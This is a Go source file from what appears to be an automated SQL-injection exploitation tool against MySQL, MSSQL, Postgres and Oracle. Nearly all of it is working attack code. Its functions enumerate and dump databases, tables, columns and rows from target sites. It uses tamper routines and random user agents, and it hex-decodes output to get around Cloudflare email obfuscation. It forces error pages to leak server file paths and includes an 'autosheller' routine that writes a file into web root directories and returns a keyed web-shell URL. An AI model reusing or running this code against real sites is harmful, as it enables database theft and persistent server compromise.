			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

func (inj *Injection) GetCurrentDatabase() (string, error) {
	index := 0
	output := ""
	for i:=0; i<2; {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = mysql.Queries["get_current_database"]
			case MSSQL:
				query = mssql.Queries["current_db"]
			case POSTGRES:
				query = postgres.Queries["current_db"]
			case ORACLE:
				query = oracle.Queries["current_db"]
			}

			if inj.Technique == BLIND {
				return inj.BlindGetData(query)
			}

			u, begincap, endcap := inj.BuildInjection(query, index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			} else {
				i++
			}
		}
	}
	return "", QueryFailed
}

func (inj *Injection) GetDBVersion () (string, error) {
	if len(inj.DBVersion) != 0 {
		return inj.DBVersion, nil
	}
	var output string
	_index := 0
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
		}
		var query string
		switch inj.DBType {
		case MYSQL:
			query = fmt.Sprintf(mysql.Queries["current_version"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case MSSQL:
			query = fmt.Sprintf(mssql.Queries["current_version"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case POSTGRES:
			query = fmt.Sprintf(postgres.Queries["current_version"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case ORACLE:
			query = fmt.Sprintf(oracle.Queries["current_version"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		}

		if inj.Technique == BLIND {
			return inj.BlindGetData(query)
		}

		u, begincap, endcap := inj.BuildInjection(query, 0, false)

		_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
		if err != nil {
			return "Failed", err
		}

		if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
			p := utils.GetStringInBetween(body, begincap, endcap)
			if len(p) == 1 && p[0] == 0x20 {
				return "", nil
			}
			output += p
			_index++
			if len(p) == inj.ChunkSize {
				continue
			}
			if inj.DBType == MSSQL {
				output = strings.ReplaceAll(output, "dbo.", "")
			}
			inj.DBVersion = utils.CleanOutput(output)
			return utils.CleanOutput(output), nil
		}
	}
}

func (inj *Injection) GetDBUser() (string, error) {
	if len(inj.DBUser) != 0 {
		return inj.DBUser, nil
	}
	var output string
	_index := 0
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
		}
		var query string
		switch inj.DBType {
		case MYSQL:
			query = fmt.Sprintf(mysql.Queries["current_user"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case MSSQL:
			query = fmt.Sprintf(mssql.Queries["current_user"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case POSTGRES:
			query = fmt.Sprintf(postgres.Queries["current_user"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		case ORACLE:
			query = fmt.Sprintf(oracle.Queries["current_user"], (inj.ChunkSize*_index)+1, inj.ChunkSize)
		}

		if inj.Technique == BLIND {
			return inj.BlindGetData(query)
		}

		u, begincap, endcap := inj.BuildInjection(query, _index, false)
		//utils.LogDebug(_url)

		_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
		if err != nil {
			return "Failed", err
		}

		if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
			p := utils.GetStringInBetween(body, begincap, endcap)
			if len(p) == 1 && p[0] == 0x20 {
				return "", nil
			}
			output += p
			_index ++
			if len(p) == inj.ChunkSize {
				continue
			}
			if inj.DBType == MSSQL {
				output = strings.ReplaceAll(output, "dbo.", "")
			}
			inj.DBUser = output
			return utils.CleanOutput(output), nil
		}
	}
}

func (inj *Injection) GetTableCount(database string) (int, error) {
	for {
		select {
		case <-utils.Done:
			return -1, errors.New("exit early")
		case <-inj.Skip:
			return -1, InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["table_count"], utils.HexStr(database))
			case MSSQL:
				query = strings.ReplaceAll(mssql.Queries["table_count"], "%s", database)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["table_count"], postgres.ConvertStringToChars(database))
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["table_count"], oracle.ConvertStringToChars(database))
			}

			if inj.Technique == BLIND {
				return inj.BlindGetInt(query)
			}

			u, begincap, endcap := inj.BuildInjection(query, 1, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				return strconv.Atoi(removeAlpha.ReplaceAllString(utils.GetStringInBetween(body, begincap, endcap), ""))
			}
		}
	}
}

func (inj *Injection) GetTable(database string, index int) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["table_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, utils.HexStr(database), index)
			case MSSQL:
				query = fmt.Sprintf(strings.ReplaceAll(mssql.Queries["table_name"], "%s", database),(inj.ChunkSize*_index)+1, inj.ChunkSize, index)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["table_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(database), index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["table_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, oracle.ConvertStringToChars(database), index)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)
				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}
				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				if inj.DBType == MSSQL {
					output = strings.ReplaceAll(output, "dbo.", "")
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

func (inj *Injection) GetColumnCount(database string, table string) (int, error) {
	for {
		select {
		case <-utils.Done:
			return -1, errors.New("exit early")
		case <-inj.Skip:
			return -1, InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["column_count"], utils.HexStr(database), utils.HexStr(table))
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["column_count"], mssql.ConvertStringToChars(database), mssql.ConvertStringToChars(table))
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["column_count"], postgres.ConvertStringToChars(table), postgres.ConvertStringToChars(database))
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["column_count"], oracle.ConvertStringToChars(table), oracle.ConvertStringToChars(database))
			}

			u, begincap, endcap := inj.BuildInjection(query, 1, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				return strconv.Atoi(removeAlpha.ReplaceAllString(utils.GetStringInBetween(body, begincap, endcap), ""))
			}
		}
	}
}

func (inj *Injection) GetColumn(database string, table string, index int) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["column_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, utils.HexStr(database), utils.HexStr(table), index)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["column_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, mssql.ConvertStringToChars(database), mssql.ConvertStringToChars(table), index)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["column_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(table), postgres.ConvertStringToChars(database), index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["column_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, oracle.ConvertStringToChars(table), oracle.ConvertStringToChars(database), index)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			/*if strings.Count(body, selector) == 1 && inj.DBType == MYSQL {
				inj.Vector = mysql.E_Vectors["gtid"]
			}*/

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

func (inj *Injection) GetColumnType(database string, table string, index int) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
		
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["get_column_type"], utils.HexStr(table), utils.HexStr(database), index)
			case MSSQL:
				query = fmt.Sprintf(strings.ReplaceAll(mssql.Queries["column_name"], "%s", database), mssql.ConvertStringToChars(table), index, mssql.ConvertStringToChars(table))
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["column_name"], postgres.ConvertStringToChars(table), postgres.ConvertStringToChars(database), index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["column_name"], oracle.ConvertStringToChars(table), oracle.ConvertStringToChars(database), index)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

var removeAlpha = regexp.MustCompile("[^0-9]+")

func (inj *Injection) GetRowCount(database string, table string) (int, error) {
	for {
		select {
		case <-utils.Done:
			return -1, errors.New("exit early")
		case <-inj.Skip:
			return -1, InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["row_count"], database, table)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["row_count"], database, table)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["row_count"], database, table)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["row_count"], database, table)
			}

			u, begincap, endcap := inj.BuildInjection(query,1, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				return strconv.Atoi(removeAlpha.ReplaceAllString(utils.GetStringInBetween(body, begincap, endcap), ""))
			}
		}
	}
}

func (inj *Injection) DumpColumn(database string, table string, column string, order string, index int) (string, error) {
	_index := 0
	output := ""
	_hex := false
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["dump_column"], column, (inj.ChunkSize*_index)+1, inj.ChunkSize, database, table, order, index)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["dump_column"], column, (inj.ChunkSize*_index)+1, inj.ChunkSize, column, database, table, index)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["dump_column"], column, (inj.ChunkSize*_index)+1, inj.ChunkSize, database, table, order, index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["dump_column"], column, (inj.ChunkSize*_index)+1, inj.ChunkSize, order, database, table, index)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, _hex)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Contains(body, "class=\"__cf_email__\"") {
				_hex = true
				continue
			}

			/*if strings.Count(body, selector) == 1 && inj.DBType == MYSQL {
				inj.Vector = mysql.E_Vectors["gtid"]
			}*/

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}

				if _hex {
					b, err := hex.DecodeString(output)
					if err != nil {
						return "", errors.New("failed hex")
					}
					output = string(b)
				}
				return strings.TrimSpace(output), nil
			}
		}
	}
}

func (inj *Injection) MaskString(input string) string {
	switch inj.DBType {
	case MYSQL:
		return fmt.Sprintf("(SELECT 0x%s)", utils.HexStr(input))
	case POSTGRES:
		return postgres.ConvertStringToChars(input)
	case MSSQL:
		return mssql.ConvertStringToChars(input)
	case ORACLE:
		return oracle.ConvertStringToChars(input)
	}
	return input
}

func (inj *Injection) DumpMultiColumn(database string, table string, columns []string, order string, index int, sep string) (string, error) {
	_index := 0
	output := ""
	_hex := false
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["dump_multi_column"], strings.Join(columns, fmt.Sprintf(",0x%s,", utils.HexStr(sep))), (inj.ChunkSize*_index)+1, inj.ChunkSize, database, table, order, index)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["dump_multi_column"], strings.Join(columns, "+"), (inj.ChunkSize*_index)+1, inj.ChunkSize, order, database, table, index)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["dump_multi_row"], strings.Join(columns, fmt.Sprintf(",(%s),", postgres.ConvertStringToChars(sep))), (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(database), table, order, index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["dump_multi_row"], strings.Join(columns, fmt.Sprintf(",(%s),", oracle.ConvertStringToChars(sep))), (inj.ChunkSize*_index)+1, inj.ChunkSize, order, database, table, index)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, _hex)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Contains(body, "class=\"__cf_email__\"") {
				_hex = true
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}

				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}

				if _hex {
					b, err := hex.DecodeString(output)
					if err != nil {
						return "", errors.New("failed hex")
					}
					output = string(b)
				}
				return strings.TrimSpace(output), nil
			}
		}
	}
}

func (inj *Injection) GetTableWithColumn(database string, column string, index int, blacklist []string) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var blacklistLikes []string
			for _, bl := range blacklist {
				blacklistLikes = append(blacklistLikes, fmt.Sprintf("AND COLUMN_NAME NOT LIKE (0x%s)", utils.HexStr(fmt.Sprintf("%%%s%%",bl))))
			}

			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["table_with_column_blacklist"], (inj.ChunkSize*_index)+1, inj.ChunkSize, utils.HexStr(database), utils.HexStr(fmt.Sprintf("%%%s%%", column)), strings.Join(blacklistLikes, " "), index)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["table_from_column"], (inj.ChunkSize*_index)+1, inj.ChunkSize, index, mssql.ConvertStringToChars(database), mssql.ConvertStringToChars(column))
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["table_from_column"], (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(database), postgres.ConvertStringToChars(column), index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["table_from_column"], (inj.ChunkSize*_index)+1, inj.ChunkSize, oracle.ConvertStringToChars(database), oracle.ConvertStringToChars(column), index)
			}
			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", nil
				}
				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

func (inj *Injection) GetTableCountWithColumn(database string, column string, blacklist []string) (int, error) {
	_index := 0
	for {
		select {
		case <-utils.Done:
			return -1, errors.New("exit early")
		case <-inj.Skip:
			return -1, InjectableSkipped
		default:
			var blacklistLikes []string
			for _, bl := range blacklist {
				if len(bl) > 0 { // REGEXP fmt.Sprintf("
					blacklistLikes = append(blacklistLikes, fmt.Sprintf("AND COLUMN_NAME NOT LIKE (0x%s)", utils.HexStr(fmt.Sprintf("%%%s%%", bl))))
				}
			}

			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["table_count_with_column_blacklist"], utils.HexStr(database), utils.HexStr(fmt.Sprintf("%%%s%%", column)), strings.Join(blacklistLikes, " "))
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["table_count_with_column"], mssql.ConvertStringToChars(database), mssql.ConvertStringToChars(column))
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["table_count_with_column"], postgres.ConvertStringToChars(database), postgres.ConvertStringToChars(column))
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["table_count_with_column"], oracle.ConvertStringToChars(database), oracle.ConvertStringToChars(column))
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				return strconv.Atoi(removeAlpha.ReplaceAllString(utils.GetStringInBetween(body, begincap, endcap), ""))
			}
		}
	}
}

func (inj *Injection) GetColumnFromTable(database string, tbl string, column string, blacklist []string) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var blacklistLikes []string
			for _, bl := range blacklist {
				blacklistLikes = append(blacklistLikes, fmt.Sprintf("AND COLUMN_NAME NOT LIKE (0x%s)", utils.HexStr(fmt.Sprintf("%%%s%%", bl))))
			}

			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["column_from_table_blacklist"], (inj.ChunkSize*_index)+1, inj.ChunkSize, utils.HexStr(database), utils.HexStr(tbl), utils.HexStr(fmt.Sprintf("%%%s%%", column)), strings.Join(blacklistLikes, " "))
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["column_from_table"], (inj.ChunkSize*_index)+1, inj.ChunkSize, mssql.ConvertStringToChars(database), mssql.ConvertStringToChars(tbl), mssql.ConvertStringToChars(column))
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["column_from_table"], (inj.ChunkSize*_index)+1, inj.ChunkSize, postgres.ConvertStringToChars(database), postgres.ConvertStringToChars(column))
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["column_from_table"], (inj.ChunkSize*_index)+1, inj.ChunkSize, oracle.ConvertStringToChars(database), oracle.ConvertStringToChars(database))
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				continue
			}

			if strings.Contains(body, "The used SELECT statements") {
				return "", errors.New("used SELECT statements")
			}

			if strings.Contains(body, "Unknown column") || strings.ReplaceAll(body, u.Query().Encode(), "") == inj.Original {
				return "", errors.New("unknown column")
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				p := utils.GetStringInBetween(body, begincap, endcap)

				if len(p) == 1 && p[0] == 0x20 {
					return "", errors.New("null output")
				}
				output += p
				_index ++
				if len(p) == inj.ChunkSize {
					continue
				}
				return utils.CleanOutput(output), nil
			}
		}
	}
}

var FILE_PATH_REGEXES = []*regexp.Regexp {
	regexp.MustCompile(`<b>(?P<result>[^<>]+?)</b> on line \d+`),
	regexp.MustCompile(`\bin (?P<result>[^<>'\"]+?)['\"]? on line \d+`),
	regexp.MustCompile(`(?:[>(\[\s])(?P<result>[A-Za-z]:[\\/][\w. \\/-]*)`),
	regexp.MustCompile(`(?:[>(\[\s])(?P<result>/\w[/\w.~-]+)`),
	regexp.MustCompile(`href=['"]file://(?P<result>/[^'"]+)`),
	regexp.MustCompile(`\bin <b>(?P<result>[^<]+): line \d+`),
}

func (inj *Injection) GetFilePath() (string, error) {
	u, _ := url.Parse(inj.Base.String())
	_u := u
	for param, vals := range u.Query() {
		uu := u.Query()
		uu.Set(param, fmt.Sprintf("%s%s", vals[0], "' SELECT CONVERT(INT,0x6368696e672063686f6e67)"))
		_u.RawQuery = uu.Encode()
		_, body, err := manager.PManager.Get(_u.String(), uarand.GetRandom())
		if err != nil {
			return "", err
		}


		//body = strings.ReplaceAll(strings.ReplaceAll(string(bluemonday.StrictPolicy().SanitizeBytes([]byte(body))), "\r", ""), "\n", " ")

		for _, reg := range FILE_PATH_REGEXES {
			if fpath := reg.FindString(body); len(fpath) > 0 {
				return path.Dir(strings.ReplaceAll(strings.TrimSpace(fpath), ">", "")), nil
			}
		}
	}
	return "", QueryFailed
}

var CommonDirectories = []string {
	"/var/www/",
	"/var/www/html",
	"/var/www/htdocs",
	"/usr/local/apache2/htdocs",
	"/usr/local/www/data",
	"/var/apache2/htdocs",
	"/var/www/nginx-default",
	"/srv/www/htdocs",
	"C:/xampp/htdocs/",
	"C:/wamp/www/",
	"C:/Inetpub/wwwroot/",
}

func (inj *Injection) DumpFile(data, rpath string) (string, error) {
	_u, _ := url.Parse(inj.Base.String())

	var query string
	switch inj.DBType {
	case MYSQL:
		query = fmt.Sprintf(mysql.Queries["dump_file"], utils.HexStr(data), fmt.Sprintf("%s/%s", rpath, viper.GetString("autosheller.filename")))
	}

	var nulls []string
	for i := 0; i < inj.UCount; i++ {
		if i == inj.UInj {
			nulls = append(nulls, query)
		} else {
			nulls = append(nulls, "NULL")
		}
	}

	qu := inj.Base.Query()
	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + " " + tamper.Tamper(fmt.Sprintf(inj.Vector, ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
	_u.RawQuery = qu.Encode()

	//payload, _ := inj.BuildInjection(query, 1, false)
	fmt.Println(_u.String())
	_, body, err := manager.PManager.Get(_u.String(), inj.UserAgent)
	if err != nil {
		return "", err
	}

	if strings.Contains(body, "Permission denied") {
		return "", errors.New("permissions")
	}

	x := path.Dir(inj.Base.Path)

	_u.Parse(path.Join(x, viper.GetString("autosheller.filename") + "?q=1"))

	v := _u.String()
	_, body, err = manager.PManager.Get(v, inj.UserAgent)
	if err != nil {
		return "", err
	}

	if strings.Contains(body,"200") {
		shell, _ := _u.Parse(path.Join(x, viper.GetString("autosheller.filename") + fmt.Sprintf("?key=%s", viper.GetString("autosheller.key"))))
		return shell.String(), nil
	}

	return "", errors.New("failed")
}

func (inj *Injection) VerifyInjection() bool {
	if _, err := inj.GetChunkSize(); err != nil {
		return false
	}
	if _, err := inj.GetDBUser(); err != nil {
		return false
	}
	return true
}

func U_GetSchemaDIOS(inj *Injection) (map[string]map[string][]string, error) {
	var err error
	sel := utils.StringOfLength(4)
	sep := utils.StringOfLength(4)

	if inj.UCount == 0 {
		inj.UCount=1
	}

	var nulls []string
	for i:=0; i < inj.UCount; i++ {
		if i == inj.UInj {
			nulls = append(nulls, fmt.Sprintf(mysql.U_DIOS["get_schema"], utils.HexStr(sel), utils.HexStr(sep), utils.HexStr(sep), utils.HexStr(sel)))
		} else {
			nulls = append(nulls, fmt.Sprintf("%d", i+1))
		}
	}

	u, err := url.Parse(inj.Base.String())
	if err != nil {
		return nil, err
	}
	qu := u.Query()

	qu.Set(inj.Parameter, qu.Get(inj.Parameter) + tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
	u.RawQuery = qu.Encode()
	_, body, err := manager.PManager.Get(u.String(), inj.UserAgent)
	if err != nil {
		inj.Errors++
		return nil, err
	}

	data := utils.ExtractData(body, sel)

	output := make(map[string]map[string][]string)
	if len(data) <= 2 {
		return nil, errors.New("dios not possible")
	}
	for _,k := range data {
		skem := strings.Split(k, sep)
		if len(skem) != 3 {
			return nil, errors.New("dios not possible")
		}
		db := strings.ReplaceAll(skem[0], sel, "")
		if len(skem) == 1 {
			continue
		}
		tbl := strings.ReplaceAll(skem[1], sel, "")
		col := strings.ReplaceAll(skem[2], sel, "")

		if _, ok := output[db]; !ok {
			output[db] = make(map[string][]string)
		}

		if _,ok := output[db][tbl]; !ok {
			output[db][tbl] = make([]string, 0)
		}

		output[db][tbl] = append(output[db][tbl], col)
	}

	return output, nil
}

func U_DumpTableDIOS(inj *Injection, database string, tbl string, cols []string) ([]string, error) {
	sel := utils.StringOfLength(4)

	var nulls []string
	for i:=0; i < inj.UCount; i++ {
		if i == inj.UInj {
			nulls = append(nulls, fmt.Sprintf(mysql.U_DIOS["dump"], database, tbl, utils.HexStr(sel), strings.Join(cols, ",0x2c,"), utils.HexStr(sel)))
		} else {
			nulls = append(nulls, fmt.Sprintf("%d", i+1))
		}
	}

	u, err := url.Parse(inj.Base.String())
	if err != nil {
		return nil, err
	}
	qu := u.Query()
	qu.Set(inj.Parameter, qu.Get(inj.Parameter) + " " + tamper.Tamper(fmt.Sprintf(U_Vectors["multi"], ParseModulator(inj.Prefix), strings.Join(nulls, ","), "", ParseModulator(inj.Suffix)), inj.Tampers))
	u.RawQuery = qu.Encode()
	_, body, err := manager.PManager.Get(u.String(), inj.UserAgent)
	if err != nil {
		inj.Errors++
		return nil, err
	}

	data := utils.ExtractData(body, sel)

	var output []string

	for _,k := range data {
		output = append(output, strings.ReplaceAll(k, sel, ""))
	}

	return output, nil
}